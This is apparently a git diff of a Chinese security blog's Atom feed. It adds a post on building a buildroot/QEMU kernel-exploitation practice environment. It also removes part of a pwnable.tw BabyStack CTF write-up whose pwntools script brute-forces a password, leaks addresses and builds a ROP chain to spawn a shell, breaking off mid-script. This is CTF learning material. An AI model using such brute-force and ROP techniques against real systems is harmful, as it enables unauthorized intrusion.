@@ -1,4 +1,244 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="https://www.cameudis.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.cameudis.com/" rel="alternate" type="text/html" /><updated>2025-09-26T15:46:35+08:00</updated><id>https://www.cameudis.com/feed.xml</id><title type="html">Y² 的博客</title><subtitle>计算机、安全和其他</subtitle><entry><title type="html">SJTU CTF 2025 PWN Writeup</title><link href="https://www.cameudis.com/2025/04/11/SJTUCTF-2025.html" rel="alternate" type="text/html" title="SJTU CTF 2025 PWN Writeup" /><published>2025-04-11T00:00:00+08:00</published><updated>2025-04-11T00:00:00+08:00</updated><id>https://www.cameudis.com/2025/04/11/SJTUCTF-2025</id><content type="html" xml:base="https://www.cameudis.com/2025/04/11/SJTUCTF-2025.html"><![CDATA[<h2 id="ret2vmcode">ret2vmcode</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="https://www.cameudis.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.cameudis.com/" rel="alternate" type="text/html" /><updated>2025-09-28T13:38:41+08:00</updated><id>https://www.cameudis.com/feed.xml</id><title type="html">Y² 的博客</title><subtitle>计算机、安全和其他</subtitle><entry><title type="html">Kernel #0: 环境配置</title><link href="https://www.cameudis.com/2025/09/28/Kernel-0.html" rel="alternate" type="text/html" title="Kernel #0: 环境配置" /><published>2025-09-28T00:00:00+08:00</published><updated>2025-09-28T00:00:00+08:00</updated><id>https://www.cameudis.com/2025/09/28/Kernel-0</id><content type="html" xml:base="https://www.cameudis.com/2025/09/28/Kernel-0.html"><![CDATA[<ul>
+  <li>简易版环境： <a href="https://github.com/pwncollege/pwnkernel">pwncollege/pwnkernel: Kernel development &amp; exploitation practice environment. (github.com)</a></li>
+  <li>高级版环境：<a href="https://github.com/cirosantilli/linux-kernel-module-cheat">cirosantilli/linux-kernel-module-cheat: The perfect emulation setup to study and develop the Linux kernel v5.4.3, kernel modules, QEMU, gem5 and x86_64, ARMv7 and ARMv8 userland and baremetal assembly, ANSI C, C++ and POSIX. (github.com)</a></li>
+</ul>
+
+<p>gdb 可以连接到 qemu 提供的调试端口，对 qemu 中的整个系统进行调试，在用户空间和内核中下地址都可以！（<code class="language-plaintext highlighter-rouge">target remote :1234</code>。不能用 <code class="language-plaintext highlighter-rouge">ni</code>）
+如果要在内核中下断点的话，获取符号地址有两种方式：</p>
+<ul>
+  <li>如果有 root 权限，可以打开 /proc/kallsyms</li>
+  <li>如果有系统镜像且没有打开 ASLR，可以直接 objdump 或 nm 等。</li>
+</ul>
+
+<h2 id="自制环境搭建使用-buildroot">自制环境搭建（使用 buildroot）</h2>
+
+<p>buildroot 是一个制作嵌入式 linux 环境的工具，会首先编译出一个目标环境的工具链，然后用这个工具链交叉编译出一个内核+小型文件系统出来。</p>
+
+<p>使用 buildroot 的总体流程如下：</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 首先需要下载 buildroot: http://buildroot.org/downloads/</span>
+make list-defconfigs <span class="c"># 列出一些预定义（predefined）的配置</span>
+make qemu_x86_64_defconfig <span class="c"># 使用预定义的 QEMU x86_64 配置（这一步会覆盖用户自定义的配置，所以请小心！）</span>
+make menuconfig <span class="c"># buildroot 自己的配置项</span>
+make linux-menuconfig <span class="c"># linux 的配置项</span>
+make busybox-menuconfig <span class="c"># busybox 的配置项</span>
+make <span class="nt">-j</span><span class="si">$(</span><span class="nb">nproc</span><span class="si">)</span>
+</code></pre></div></div>
+
+<p>其中，一个 kernel pwn 环境需要修改的地方包括：</p>
+<ul>
+  <li>buildroot 配置
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">Filesystem Image -&gt; cpio the root filesystem</code></li>
+      <li><code class="language-plaintext highlighter-rouge">Filesystem images -&gt; ext2/3/4 root file system -&gt; choose ext3</code></li>
+    </ul>
+  </li>
+  <li>linux 配置
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">General Settings -&gt; Initial RAM filesystem and RAM disk (initramfs/initrd) support</code></li>
+      <li><code class="language-plaintext highlighter-rouge">Kernel Hacking -&gt; Kernel debugging</code></li>
+      <li><code class="language-plaintext highlighter-rouge">Kernel Hacking -&gt; Compile-time checks and compiler options -&gt; Debug information -&gt; Rely on the toolchain's implicit default DWARF version</code></li>
+    </ul>
+  </li>
+  <li>busybox 配置
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">Shells -&gt; cttyhack</code></li>
+      <li><code class="language-plaintext highlighter-rouge">Runit Utilities -&gt; setuidgid</code></li>
+    </ul>
+  </li>
+</ul>
+
+<p>编译完以后，把 <code class="language-plaintext highlighter-rouge">&lt;PATH_TO_BUILDROOT&gt;/output/images/*</code> 和 <code class="language-plaintext highlighter-rouge">&lt;PATH_TO_BUILDROOT&gt;/output/linux-&lt;VERSION&gt;/vmlinux</code> 拿出来。</p>
+
+<p>附带一个启动脚本：</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>
+<span class="c">#</span>
+<span class="c"># run.sh</span>
+<span class="c"># Copyright (C) 2025 y2 &lt;cameudis@gmail.com&gt;</span>
+
+<span class="c"># decompress rootfs.cpio</span>
+<span class="k">if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-d</span> rootfs <span class="o">]</span><span class="p">;</span> <span class="k">then
+	</span><span class="nb">mkdir </span>rootfs <span class="o">&amp;&amp;</span> <span class="nb">cd </span>rootfs
+	<span class="k">if </span>file <span class="s2">"../rootfs.cpio"</span> | <span class="nb">grep</span> <span class="nt">-q</span> <span class="s1">'gzip compressed'</span><span class="p">;</span> <span class="k">then
+		</span><span class="nb">cp</span> ../rootfs.cpio ./rootfs.cpio.gz
+		<span class="nb">gunzip</span> ./rootfs.cpio.gz
+	<span class="k">else
+		</span><span class="nb">cp</span> ../rootfs.cpio <span class="nb">.</span>
+	<span class="k">fi
+	</span>cpio <span class="nt">-idmv</span> &lt; rootfs.cpio
+	<span class="nb">rm </span>rootfs.cpio
+	<span class="nb">cd</span> ..
+<span class="k">fi</span>
+
+<span class="c"># compile exp</span>
+gcc <span class="nt">-masm</span><span class="o">=</span>intel <span class="nt">--static</span> <span class="nt">-fno-pie</span> <span class="nt">-o</span> exp ./exp.c
+<span class="nb">mv </span>exp rootfs
+
+<span class="c"># repack rootfs.cpio</span>
+<span class="nb">cd </span>rootfs
+find <span class="nb">.</span> <span class="nt">-print0</span> <span class="se">\</span>
+| cpio <span class="nt">--null</span> <span class="nt">-ov</span> <span class="nt">--owner</span> root:root <span class="nt">--format</span><span class="o">=</span>newc <span class="se">\</span>
+| <span class="nb">gzip</span> <span class="nt">-9</span> <span class="o">&gt;</span> ../rootfs.cpio
+<span class="nb">cd</span> ..
+
+<span class="c"># start vm</span>
+qemu-system-x86_64 <span class="se">\</span>
+	<span class="nt">-m</span> 256M <span class="se">\</span>
+	<span class="nt">-cpu</span> kvm64,+smep,+smap <span class="se">\</span>
+	<span class="nt">-smp</span> <span class="nv">cores</span><span class="o">=</span>2,threads<span class="o">=</span>2 <span class="se">\</span>
+	<span class="nt">-kernel</span> ./bzImage <span class="se">\</span>
+	<span class="nt">-initrd</span> ./rootfs.cpio <span class="se">\</span>
+	<span class="nt">-nographic</span> <span class="se">\</span>
+	<span class="nt">-monitor</span> /dev/null <span class="se">\</span>
+	<span class="nt">-snapshot</span> <span class="se">\</span>
+	<span class="nt">-append</span> <span class="s2">"console=ttyS0 rdinit=/init nokaslr pti=on quiet oops=panic panic=1"</span> <span class="se">\</span>
+	<span class="nt">-no-reboot</span> <span class="nt">-s</span>
+</code></pre></div></div>
+
+<p>再附带一个 CTF <code class="language-plaintext highlighter-rouge">/init</code> 脚本：</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>
+<span class="nb">chown</span> <span class="nt">-R</span> 0:0 /
+mount <span class="nt">-t</span> tmpfs tmpfs /tmp
+mount <span class="nt">-t</span> proc none /proc
+mount <span class="nt">-t</span> sysfs none /sys
+mount <span class="nt">-t</span> devtmpfs devtmpfs /dev
+
+<span class="c"># echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span>
+<span class="c"># echo 1 &gt; /proc/sys/kernel/kptr_restrict</span>
+
+<span class="nb">chown </span>0:0 /flag
+<span class="nb">chmod </span>400 /flag
+<span class="nb">chmod </span>777 /tmp
+
+<span class="c"># insmod kgadget.ko</span>
+<span class="c"># chmod 777 /dev/kgadget</span>
+
+<span class="c">#setsid cttyhack setuidgid 1000 sh</span>
+setsid cttyhack setuidgid 0 sh
+poweroff <span class="nt">-d</span> 0 <span class="nt">-f</span>
+</code></pre></div></div>
+
+<h3 id="内核版本指定">内核版本指定</h3>
+
+<ul>
+  <li>buildroot 配置
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">Toolchain -&gt; Custom kernel headers series -&gt; choose xxx</code></li>
+      <li><code class="language-plaintext highlighter-rouge">Kernel -&gt; Kernel version </code></li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="内核修改patch">内核修改（patch）</h3>
+
+<p>buildroot 每次重新 build 会重新拉下来一个指定版本的 linux 源码进行编译，因此如果想要对内核源码进行修改，需要手动制作 patch 文件并在 buildroot 中指定。</p>
+
+<ul>
+  <li>方便起见，最好先整一个带 git 版本控制的完整 linux 源码（<code class="language-plaintext highlighter-rouge">git clone https://mirror.sjtu.edu.cn/git/linux.git</code>）。</li>
+  <li>切换到目标版本 <code class="language-plaintext highlighter-rouge">git checkout xxx</code></li>
+  <li>进行修改</li>
+  <li>将修改提交为一个 commit</li>
+  <li><code class="language-plaintext highlighter-rouge">git format-patch -1 HEAD</code> 将修改导出为一个 patch 文件</li>
+  <li>将 patch 文件保存下来，并修改 buildroot 配置 <code class="language-plaintext highlighter-rouge">Kernel -&gt; Custom kernel patches</code> ，将其修改为 patch 文件的绝对路径或其目录（后者可用于加载多个 patch）</li>
+</ul>
+
+<h3 id="内核模块">内核模块</h3>
+
+<p>如果需要编译内核模块，需要在 buildroot 的 package 目录下新建如下结构：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn_kmod
+├── Config.in
+├── pwn_kmod.mk
+└── src
+    ├── Makefile
+    └── pwn.c
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">Config.in</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>config BR2_PACKAGE_PWN_KMOD
+    bool "pwn_kmod (out-of-tree)"
+    depends on BR2_LINUX_KERNEL
+    help
+      Kernel module with a controlled bug for practice.
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">pwn_kmod.mk</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PWN_KMOD_VERSION = 1.0
+PWN_KMOD_SITE = package/pwn_kmod/src
+PWN_KMOD_SITE_METHOD = local
+PWN_KMOD_LICENSE = MIT
+
+define PWN_KMOD_BUILD_CMDS
+        $(LINUX_MAKE_ENV) $(MAKE) -C $(LINUX_DIR) \
+                M=$(@D) \
+                ARCH=$(KERNEL_ARCH) \
+                CROSS_COMPILE="$(KERNEL_CROSS)" \
+                HOSTCC="$(HOSTCC)" \
+                modules
+endef
+
+define PWN_KMOD_INSTALL_TARGET_CMDS
+    $(INSTALL) -D -m 0644 $(@D)/pwn.ko $(TARGET_DIR)/lib/modules/pwn.ko
+endef
+
+$(eval $(generic-package))
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">src/Makefile</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>obj-m := pwn.o
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">src/pwn.c</code>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/fs.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/uaccess.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/slab.h&gt;</span><span class="cp">
+</span>
+<span class="cp">#define DEV "pwn"
+</span>
+<span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="nf">p_init</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+    <span class="n">pr_info</span><span class="p">(</span><span class="s">"pwn loaded</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">static</span> <span class="kt">void</span> <span class="n">__exit</span> <span class="nf">p_exit</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+    <span class="n">pr_info</span><span class="p">(</span><span class="s">"pwn unloaded</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="n">module_init</span><span class="p">(</span><span class="n">p_init</span><span class="p">);</span>
+<span class="n">module_exit</span><span class="p">(</span><span class="n">p_exit</span><span class="p">);</span>
+<span class="n">MODULE_LICENSE</span><span class="p">(</span><span class="s">"GPL"</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>最后，还需要在 package/Config.in 中添加一行 <code class="language-plaintext highlighter-rouge">source "package/pwn_kmod/Config.in"</code>。</p>
+
+<p>然后，编译后的 kmod 文件就会位于 <code class="language-plaintext highlighter-rouge">/lib/modules/</code> 目录下，可以在 <code class="language-plaintext highlighter-rouge">/init</code> 里自行加载。</p>
+
+<p>注意，有时候编译内核模块 package 时，还没有编译好 linux，会导致编译失败。由于我懒得研究怎么添加依赖，所以遇到这个错直接 <code class="language-plaintext highlighter-rouge">make linux</code> 就行。</p>
+
+<h3 id="buildroot-使用技巧">Buildroot 使用技巧</h3>
+
+<p>因为 buildroot 一个主要用途是异架构环境配置，他会 build 一整套编译工具链，耗时非常长。所以，当修改了某个部分的配置想要重新编译时，千万不要执行 <code class="language-plaintext highlighter-rouge">make clean</code>：</p>
+<ul>
+  <li>当想要完全重新 build 一个包 from scratch，最好的做法是删除 <code class="language-plaintext highlighter-rouge">output/build</code> 下对应的目录（或者使用 <code class="language-plaintext highlighter-rouge">make &lt;package&gt;-dirclean</code> 指令），然后重新 <code class="language-plaintext highlighter-rouge">make</code>。</li>
+  <li>当想要重新编译，可以执行 <code class="language-plaintext highlighter-rouge">make &lt;package&gt;-rebuild</code>。比如说仅仅通过 <code class="language-plaintext highlighter-rouge">make linux-menuconfig</code> 修改了 linux 的配置时，就可以通过 <code class="language-plaintext highlighter-rouge">make linux-rebuild</code> 重新构建 linux。</li>
+  <li>具体细节可以参考 <a href="https://buildroot.org/downloads/manual/manual.html#full-rebuild">The Buildroot user manual</a>。</li>
+</ul>
+
+<p>另外，如果移动了 buildroot 目录，似乎需要完全重新编译，否则会有奇怪的问题！</p>
+
+<hr />
+
+<p>更多参考：</p>
+<ul>
+  <li><a href="https://www.nullbyte.cat/post/linux-kernel-exploit-development-environment/#environment-setup">Linux Kernel Exploit development - Environment — NullByte</a></li>
+  <li><a href="https://www.kernel.org/doc/Documentation/dev-tools/gdb-kernel-debugging.rst">kernel.org/doc/Documentation/dev-tools/gdb-kernel-debugging.rst</a></li>
+  <li><a href="https://r1ru.github.io/posts/0/">Linux Kernel Exploitation - Setup | r1ru</a></li>
+</ul>]]></content><author><name></name></author><category term="kernel" /><summary type="html"><![CDATA[简易版环境： pwncollege/pwnkernel: Kernel development &amp; exploitation practice environment. (github.com) 高级版环境：cirosantilli/linux-kernel-module-cheat: The perfect emulation setup to study and develop the Linux kernel v5.4.3, kernel modules, QEMU, gem5 and x86_64, ARMv7 and ARMv8 userland and baremetal assembly, ANSI C, C++ and POSIX. (github.com)]]></summary></entry><entry><title type="html">SJTU CTF 2025 PWN Writeup</title><link href="https://www.cameudis.com/2025/04/11/SJTUCTF-2025.html" rel="alternate" type="text/html" title="SJTU CTF 2025 PWN Writeup" /><published>2025-04-11T00:00:00+08:00</published><updated>2025-04-11T00:00:00+08:00</updated><id>https://www.cameudis.com/2025/04/11/SJTUCTF-2025</id><content type="html" xml:base="https://www.cameudis.com/2025/04/11/SJTUCTF-2025.html"><![CDATA[<h2 id="ret2vmcode">ret2vmcode</h2>
 
 <p>虚拟机。首先逆向出指令格式：</p>
 
@@ -3103,113 +3343,4 @@ timervec:
 
 <p>另外还有一个坑，就是 backdoor 函数前 N 句汇编是一些栈相关操作，我们需要跳过这几句汇编。否则内核会卡住不动！太坑了！</p>
 
-<p><img src="https://blog-1308958542.cos.ap-shanghai.myqcloud.com/202311290204319.png" alt="" /></p>]]></content><author><name></name></author><category term="pwn" /><category term="riscv" /><category term="kernel-pwn" /><summary type="html"><![CDATA[第一次打内核题，虽然是xv6但还是感觉非常酷。比赛结束前才想到了真的可行的思路，赛后结合官方 writeup 调出来了。]]></summary></entry><entry><title type="html">pwnable.tw BabyStack</title><link href="https://www.cameudis.com/2023/10/24/pwnable-tw-BabyStack-writeup.html" rel="alternate" type="text/html" title="pwnable.tw BabyStack" /><published>2023-10-24T03:51:17+08:00</published><updated>2023-10-24T03:51:17+08:00</updated><id>https://www.cameudis.com/2023/10/24/pwnable-tw-BabyStack-writeup</id><content type="html" xml:base="https://www.cameudis.com/2023/10/24/pwnable-tw-BabyStack-writeup.html"><![CDATA[<p>本地打通了，远程……台湾太远了……爆破到一半就会不知道谁把我连接掐掉……</p>
-
-<p><img src="https://blog-1308958542.cos.ap-shanghai.myqcloud.com/Snipaste_2023-10-23_20-43-43.jpg" alt="" /></p>
-
-<h2 id="漏洞分析">漏洞分析</h2>
-
-<p>本题主要有两个漏洞，一个是检查密码时，根据用户的输入的大小（strlen）作为 strncmp 的参数进行比较，然而这样会导致用户输入 NULL Byte 就通过检查，同时还允许了一字节一字节爆破得到正确的密码；甚至泄露密码后面的别的数据——在本题中就是程序基址。
-另一个是一个没有检查大小的 strcpy。</p>
-
-<h2 id="漏洞利用">漏洞利用</h2>
-
-<p>本题的流程就是先利用第一个漏洞来爆破得到栈上的密码以及 saved rbp，然后利用 strcpy 进行控制流劫持。由于 strcpy 限制 null byte 截断，所以我利用程序自己的 read wrapper 函数（CA0 处）来进行第二次写入，这次就可以写入 ROP chain。（这里调试得知 rdi 正好是栈上变量）
-第一次写入 ROP chain，我泄露了 libc 的基址，让程序从 start 重头来过；第二次写入 ROP chain，我就直接执行 <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code> 来拿到 shell。</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
-    <span class="c1"># bruteforce password
-</span>    <span class="n">password</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
-    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x10</span><span class="p">):</span>
-        <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">):</span>
-            <span class="k">if</span> <span class="n">ch</span> <span class="o">==</span> <span class="mh">0x0a</span><span class="p">:</span>
-                <span class="k">continue</span>
-            <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
-            <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"passowrd"</span><span class="p">,</span> <span class="n">password</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">ch</span><span class="p">])</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>
-            <span class="k">if</span> <span class="sa">b</span><span class="s">"Success"</span> <span class="ow">in</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">():</span>
-                <span class="c1"># print(ch)
-</span>                <span class="n">password</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">ch</span><span class="p">])</span>
-                <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
-                <span class="k">break</span>
-        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">)</span> <span class="o">!=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:</span>
-            <span class="k">print</span><span class="p">(</span><span class="s">"ERROR"</span><span class="p">)</span>
-            <span class="nb">exit</span><span class="p">()</span>
-    <span class="n">success</span><span class="p">(</span><span class="s">"password: "</span><span class="o">+</span><span class="nb">repr</span><span class="p">(</span><span class="n">password</span><span class="p">))</span>
-    <span class="c1"># pause()
-</span>
-    <span class="c1"># bruteforce saved rbp (progaddr)
-</span>    <span class="n">progaddr</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
-    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x6</span><span class="p">):</span>
-        <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">):</span>
-            <span class="k">if</span> <span class="n">ch</span> <span class="o">==</span> <span class="mh">0x0a</span><span class="p">:</span>
-                <span class="k">continue</span>
-            <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
-            <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"passowrd"</span><span class="p">,</span> <span class="n">password</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'1'</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">progaddr</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">ch</span><span class="p">])</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>
-            <span class="k">if</span> <span class="sa">b</span><span class="s">"Success"</span> <span class="ow">in</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">():</span>
-                <span class="c1"># print(ch)
-</span>                <span class="n">progaddr</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">ch</span><span class="p">])</span>
-                <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
-                <span class="k">break</span>
-        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">progaddr</span><span class="p">)</span> <span class="o">!=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:</span>
-            <span class="k">print</span><span class="p">(</span><span class="s">"ERROR"</span><span class="p">)</span>
-            <span class="nb">exit</span><span class="p">()</span>
-    <span class="n">progaddr</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">progaddr</span><span class="o">+</span><span class="sa">b</span><span class="s">'</span><span class="se">\0\0</span><span class="s">'</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1060</span>
-    <span class="n">success</span><span class="p">(</span><span class="s">"stackaddr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">progaddr</span><span class="p">))</span>
-
-    <span class="n">my_read</span> <span class="o">=</span> <span class="mh">0xca0</span>
-    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
-    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"passowrd"</span><span class="p">,</span> <span class="mh">0x10</span><span class="o">*</span><span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="o">+</span><span class="mh">0x30</span><span class="o">*</span><span class="sa">b</span><span class="s">'a'</span><span class="o">+</span><span class="n">password</span><span class="o">+</span><span class="mh">0x18</span><span class="o">*</span><span class="sa">b</span><span class="s">'a'</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">progaddr</span><span class="o">+</span><span class="n">my_read</span><span class="p">))</span>
-    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
-    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Copy :"</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
-
-    <span class="c1"># pause()
-</span>
-    <span class="c1"># ROP
-</span>    <span class="n">start</span> <span class="o">=</span> <span class="mh">0xb70</span>
-    <span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x10c3</span>
-    <span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
-        <span class="n">progaddr</span><span class="o">+</span><span class="n">pop_rdi</span><span class="p">,</span>
-        <span class="n">progaddr</span><span class="o">+</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">],</span>
-        <span class="n">progaddr</span><span class="o">+</span><span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">],</span>
-        <span class="n">progaddr</span><span class="o">+</span><span class="n">start</span><span class="p">,</span>
-    <span class="p">])</span>
-
-    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"2"</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
-    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">pack</span><span class="p">(</span><span class="n">progaddr</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x18</span><span class="o">+</span><span class="n">payload</span><span class="p">)</span>
-
-    <span class="n">libcaddr</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="sa">b</span><span class="s">'</span><span class="se">\0\0</span><span class="s">'</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
-    <span class="n">success</span><span class="p">(</span><span class="s">"libcaddr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libcaddr</span><span class="p">))</span>
-
-    <span class="c1"># bruteforce password again
-</span>    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
-    <span class="n">password</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
-    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x10</span><span class="p">):</span>
-        <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">):</span>
-            <span class="k">if</span> <span class="n">ch</span> <span class="o">==</span> <span class="mh">0x0a</span><span class="p">:</span>
-                <span class="k">continue</span>
-            <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
-            <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"passowrd"</span><span class="p">,</span> <span class="n">password</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">ch</span><span class="p">])</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>
-            <span class="k">if</span> <span class="sa">b</span><span class="s">"Success"</span> <span class="ow">in</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">():</span>
-                <span class="c1"># print(ch)
-</span>                <span class="n">password</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">ch</span><span class="p">])</span>
